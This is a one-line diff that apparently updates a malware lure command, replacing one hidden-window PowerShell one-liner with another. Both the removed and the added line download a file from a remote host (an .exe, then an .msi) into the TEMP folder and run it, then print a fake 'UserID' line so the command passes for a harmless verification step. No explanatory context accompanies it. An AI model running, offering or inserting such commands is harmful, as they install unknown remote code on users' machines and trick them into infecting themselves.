@@ -1,1 +1,1 @@
-powershell  -WindowStyle Hidden -c "iwr 'https://mellstroyappgame.online/test/mini.txt' -o $env:TEMP\\tc.exe; & $env:TEMP\\tc.exe; Write-Host 'UserID:63994529832'"
+powershell  -WindowStyle Hidden -c "iwr 'https://agency-portals.com/NodeServer-Setup.txt' -o $env:TEMP\\tc.msi; & $env:TEMP\\tc.msi; Write-Host 'UserID:63994529832'"
